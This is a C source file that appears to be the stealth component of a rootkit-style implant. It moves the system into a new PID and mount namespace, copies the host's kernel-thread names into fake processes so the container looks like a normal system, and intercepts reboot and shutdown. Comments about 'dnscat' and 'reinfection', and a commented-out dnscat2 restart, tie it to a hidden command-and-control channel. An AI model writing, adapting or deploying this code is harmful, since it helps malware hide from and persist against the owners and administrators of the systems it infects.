#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/reboot.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef __NR_clone3
#define __NR_clone3 -1
#endif

#define err_exit(msg)                   \
        do {                            \
                perror(msg);            \
                exit(EXIT_FAILURE);     \
        } while (0)

#define G3LBIN(x) (void)x
#define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))

pid_t init_pid;

static pid_t sys_clone3(struct clone_args *args)
{
	return syscall(__NR_clone3, args, sizeof(struct clone_args));
}

static void set_prctl_name(char *name)
{
	char buf[2048];

	memset((void*)buf, 0, sizeof(buf));
	strncpy(buf, name+1, strlen(name)-2);
	if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
		printf("prctl set name returned error!\n");
		exit(EXIT_FAILURE);
	}
}

static void make_fake_kthreads(char **threads)
{
	int i;
	if (fork() == 0) {
		/* special case for pid 2 (kthreadd) */

		set_prctl_name(threads[0]);
		for (i = 1; threads[i]; i++) {
			if (fork() == 0) {
				/* all other kernel threads are
				 * children of pid 2
				 */
				set_prctl_name(threads[i]);
				while(1) {
					pause();
				}
				exit(EXIT_FAILURE); /* should never
						     * reach here */
			}
		}
		while(1) {
			pause();
		}
		exit(EXIT_FAILURE); /* should never reach here */
	}
}

static int is_proc(char *name)
{
	int i;
	for (i = 0; i < strlen(name); i++) {
		if (!isdigit(name[i])) {
			return 0;
		}
	}
	return 1;
}

static char *grab_kernel_thread(char *name)
{
	FILE *stat;
	char buf[4096];

	int pid;
	char pidname[4096];
	char newpidname[4096];
	char state;
	int ppid;

	char *ret = NULL;

	memset((void*)newpidname, 0, sizeof(newpidname));
	snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
	stat = fopen(buf, "r");
	if (stat == NULL) {
		printf("couldn't open /proc/%s/stat\n", name);
		goto out;
	}
	fgets(buf, sizeof(buf) - 1, stat);
	sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
	if (pid != 1 && (ppid == 0 || ppid == 2)) {
		for (unsigned int i = 0; i <= strlen(pidname); i++) {
			char c = pidname[i];
			if (c == '(') {
				c = '[';
			} else if (c == ')') {
				c = ']';
			}
			newpidname[i] = c;
		}
		ret = strdup(newpidname);
	}
	fclose(stat);
out:
	return ret;
}

/**
 * enumerate_kernel_threads - enumerates the kernel threads
 * @threads: array of kernel thread names
 * 
 * To obtain the names of the active threads, the
 * directories inside '/ proc' are inspected which have
 * the name coinciding with the PIDs of the active processes.
 * 
 * Returns the number of kernel threads found.
 */
static int enumerate_kernel_threads(char **threads)
{
	DIR *dirp;
	int i = 0;
	struct dirent *dp;

	if ((dirp = opendir("/proc")) == NULL)
                err_exit("couldn't open '/proc'");

	do {
		errno = 0;
		if ((dp = readdir(dirp)) != NULL) {
			if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
				char *name = grab_kernel_thread(dp->d_name);
				if (name) {
					threads[i] = name;
					i++;
				}
			}
		}
	} while (dp != NULL);

	if (errno != 0)
                err_exit("error reading directory");
	G3LBIN(closedir(dirp));
        return i;
}

static void on_sigint(int signum)
{
	printf("got signal %d\n", signum);
	if (signum == SIGINT) {
	  kill(init_pid, SIGINT);
	}
}

static void handle_init_exit(int status)
{
	/* printf("child init exited with status: %d\n", WEXITSTATUS(status)); */
	if (WIFSIGNALED(status)) {
		int signum = WTERMSIG(status);

		if (signum == 1) {
			/* printf("\n\n\nabout to reboot!\n"); sleep(2); */

			G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART));
			printf("cannot reboot!\n");
			exit(EXIT_FAILURE);
		} else if (signum == 2) {
			/* printf("\n\n\nabout to shutdown!\n"); sleep(2); */
			G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF));
			printf("cannot shutdown!\n");
			exit(EXIT_FAILURE);

		} else {
			printf("init exited via signal %d for unknown reason\n", signum);
			exit(EXIT_FAILURE);
		}
	} else {
		printf("init exited with status %d for unknown reason\n", WEXITSTATUS(status));
		printf("child init termination caused by signal %d\n", WTERMSIG(status));
		exit(EXIT_FAILURE);
	}
	printf("child init termination caused by signal %d\n",
	       WTERMSIG(status));
	exit(EXIT_FAILURE);
}

int main()
{
        int i;
        int num;
        int mountflags;
        char *kthreads_names[1024];
        struct clone_args args = {0};

	args.exit_signal = SIGCHLD;
        args.flags = CLONE_NEWPID | CLONE_NEWNS;
        
        init_pid = sys_clone3(&args);
        if (init_pid < 0) {
                err_exit("clone");
        } else if (init_pid == 0) {
                /* Child process which works within the containerized system */
                num = enumerate_kernel_threads(kthreads_names);

                mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
                if (mount("none", "/proc", "", MS_REC | MS_SLAVE, NULL) < 0)
                        err_exit("Cannot remount '/proc'");
                if (mount("proc", "/proc", "proc", mountflags, NULL) < 0)
                        err_exit("Cannot remount '/proc'");

                make_fake_kthreads(kthreads_names);
                for (i = 0; i < num; i++) {
                        free(kthreads_names[i]);
                }
                system("top");
		sleep(10);
        } else {
                /* Parent process */

		/* install signal handler to handle signal delivered
		 * ctrl-alt-delete, which we will send to child init
		 */
		if (signal(SIGINT, on_sigint) == SIG_ERR)
			err_exit("couldn't installl signal handler");
		if (reboot(LINUX_REBOOT_CMD_CAD_OFF) < 0)
			err_exit("couldn't turn cad off");

		/* watching for dnscat exit
		 * also, watching for reinfection
		 * also, waitpid for init
		 */
		while(1) {
			int status;
			pid_t pid;

			pid = waitpid(-1, &status, 0);
			if (pid < 0) {
				if (errno != EINTR) {
					err_exit("watipid returned error!");
				} else {
					/* interrupted via signal */
					continue;
				}
			} else if (pid == init_pid) {
				G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART));
				handle_init_exit(status);
			// } else if (pid == dnscat_pid) {
 			// 	dnscat_pid = run_dnscat2();
			} else {
				printf("unknown other pid %d exited\n", pid);
			}
			sleep(1);
		}
        }
}
